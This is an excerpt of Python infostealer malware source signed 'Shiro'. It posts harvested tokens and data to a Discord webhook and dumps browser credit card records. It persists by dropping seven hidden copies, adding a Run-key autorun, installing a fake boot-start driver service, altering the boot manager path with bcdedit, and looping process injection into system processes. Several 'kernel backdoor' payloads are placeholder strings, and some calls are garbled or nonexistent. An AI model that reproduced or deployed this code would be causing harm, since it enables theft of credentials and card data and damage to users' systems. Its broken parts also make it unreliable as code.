...
def main(webhook: str):
    ...
    data = {
        "username": "Shiro Main Bitch",
        "avatar_url": "https://th.bing.com/th/id/OIP.qjlAADaJ6qH2pH8yuhJ_2wHaFj?w=231&h=180&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3"
    }
...
def startup():
    """Deep profile persistence - 7 hidden copies + KERNEL BACKDOORS & INJECTION - ALL-IN-ONE"""
    ...
    # Clean existing copies first
    all_paths = []
    
    # 1. Deep LocalAppData profile
    path1 = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Windows", "Cursors", ".system", "luna_helper.exe")
    all_paths.append(path1)
    
    # 2. Deep Documents profile  
    path2 = os.path.join(os.getenv("USERPROFILE"), "Documents", ".config", "update_svc.exe")
    all_paths.append(path2)
    
    # 3. Deep Desktop profile
    path3 = os.path.join(os.getenv("USERPROFILE"), "Desktop", ".cache", "sys_helper.exe")
    all_paths.append(path3)
    
    # 4. Deep AppData profile
    path4 = os.path.join(os.getenv("APPDATA"), ".config", "Microsoft", "SystemData", "luna_svc.exe")
    all_paths.append(path4)
    
    # 5. Deep Temp
    path5 = os.path.join(os.getenv("TEMP"), ".sys", "cache_helper.exe")
    all_paths.append(path5)
    
    # 6. Deep AppData (your original style)
    path6_dir = os.path.join(os.getenv("APPDATA"), ".luna", "system")
    path6 = os.path.join(path6_dir, "service.exe")
    all_paths.append(path6)
    
    # 7. Deep User folder (your original style)  
    path7_dir = os.path.join(os.getenv("USERPROFILE"), ".data", "cache")
    path7 = os.path.join(path7_dir, "helper.exe")
    ...
    # Deploy fresh copies + hidden/system attributes
    for target_path in all_paths:
        try:
            target_dir = os.path.dirname(target_path)
            os.makedirs(target_dir, exist_ok=True)
            shutil.copy2(source_path, target_path)
            # Set hidden + system attributes inline
            try:
                windll.kernel32.SetFileAttributesW(str(target_path), 0x02 | 0x04)
            except:
                pass
        except Exception:
            continue
    
    # === KERNEL BACKDOOR 1: Driver Dropper ===
    kernel_svc_path = os.path.join(os.getenv("WINDIR"), "System32", "drivers", "lunasvc.sys")
    try:
        driver_stub = b"[KERNEL DRIVER] SSDT NtCreateFile hook + C2 beacon\nPayload: %s" % source_path.encode()
        os.makedirs(os.path.dirname(kernel_svc_path), exist_ok=True)
        with open(kernel_svc_path, 'wb') as f:
            f.write(driver_stub)
        
        # Install boot-start service
        hscm = windll.advapi32.OpenSCManagerW(None, None, 0xF003F)
        if hscm:
            windll.advapi32.CreateServiceW(hscm, "LunaSysDriver", "LunaSysDriver",
                                         0xF01FF, 1, 1, 0, kernel_svc_path, None, None, None, None, None)
            windll.advapi32.StartServiceW(windll.advapi32.OpenServiceW(hscm, "LunaSysDriver", 0xF01FF), 0, None)
    except:
        pass
    
    # === KERNEL BACKDOOR 2: SSDT Hook DLL ===
    ssdt_payload = os.path.join(os.getenv("TEMP"), ".sys", "ssdt.dll")
    try:
        dll_stub = b"[SSDT HOOK DLL] NtTerminateProcess hook + lsass inject\nC2: %s" % source_path.encode()
        os.makedirs(os.path.dirname(ssdt_payload), exist_ok=True)
        with open(ssdt_payload, 'wb') as f:
            f.write(dll_stub)
        
        # Registry autorun injection
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "LunaSSDT", 0, winreg.REG_SZ, f'rundll32.exe "{ssdt_payload}",HookSSDT')
        winreg.CloseKey(key)
    except:
        pass
    
    # === KERNEL BACKDOOR 3: UEFI NVRAM ===
    uefi_path = os.path.join(os.getenv("WINDIR"), "Boot", "EFI", "luna.efi")
    try:
        efi_stub = b"[UEFI SHELLCODE] BootKit + KASLR bypass"
        os.makedirs(os.path.dirname(uefi_path), exist_ok=True)
        with open(uefi_path, 'wb') as f:
            f.write(efi_stub)
        ctypes.windll.osutil.run_cmd("bcdedit /set {bootmgr} path \\Boot\\EFI\\luna.efi")
    except:
        pass
    
    # === KERNEL BACKDOOR 4: APC Queue Injector (start thread) ===
    try:
        threading.Thread(target=lambda: kernel_inject_loop(source_path), daemon=True).start()
    except:
        pass

def kernel_inject_loop(source_path):
    """Inline APC injection loop"""
    payloads = ["explorer.exe", "svchost.exe", "winlogon.exe", "csrss.exe"]
    import psutil
    import time
    
    while True:
        try:
            for procname in payloads:
                for p in psutil.process_iter():
                    if p.name().lower() == procname.lower():
                        # APC injection shellcode
                        shellcode = b"\x90\x90" + open(source_path, 'rb').read()[:0x1000]
                        hproc = windll.kernel32.OpenProcess(0x1F0FFF, False, p.pid)
                        if hproc:
                            ctypes.windll.kernel32.QueueUserAPC(
                                ctypes.cast(shellcode, ctypes.POINTER(ctypes.c_void_p)).contents.value,
                                hproc, 0
                            )
        except:
            pass
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Shiro Slaving again | Created By Shiro"
                    },
                    "thumbnail": {
                        "url": "https://th.bing.com/th/id/OIP.mbn-H3b_DMDdbOIAKsFB5AHaJQ?w=137&h=180&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3"
                    }
                }
            ],
            "username": "Shiro Main Bitch",
            "avatar_url": "https://th.bing.com/th/id/OIP.mbn-H3b_DMDdbOIAKsFB5AHaJQ?w=137&h=180&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3"
        }
                            ...
                            "embeds": [
                                {
                                    ...
                                    "footer": {
                                        "text": "Shiro Slaving | Created By Shiro"
                                    },
                                }
                            ],
                            "username": "Shiro Main Bitch",
                            "avatar_url": "https://tse1.mm.bing.net/th/id/OIP.M2J-VT2GnBbAv0ky57HhnwHaFj?rs=1&pid=ImgDetMain&o=7&rm=3",
                        }
                        requests.post(webhook, json=data)
    ...
    def upload(self, webhook):
        for token in self.tokens:
            ...
            data = {
                ...
                "username": "Shiro Main Bitch",
                "avatar_url": "https://th.bing.com/th/id/OIP.mbn-H3b_DMDdbOIAKsFB5AHaJQ?w=135&h=180&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3",
            }
...
def credit_cards(self, name: str, path: str, profile: str):
    ...
    with open(cc_file_path, 'a', encoding="utf-8") as f:
        if os.path.getsize(cc_file_path) == 0:
            f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  CVV |  Card Number  |  Date Modified\n\n")
        for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, cvv_encrypted FROM credit_cards").fetchall():
            name_on_card, expiration_month, expiration_year, card_number_encrypted, cvv_encrypted = res
            masterkey = getpass("Enter master key: ")
            cipher_suite = Fernet(masterkey)
            card_number = cipher_suite.decrypt(card_number_encrypted).decode()
            cvv = cipher_suite.decrypt(cvv_encrypted).decode()
            f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {cvv} |  {card_number}\n")
    cursor.close()
    conn.close()
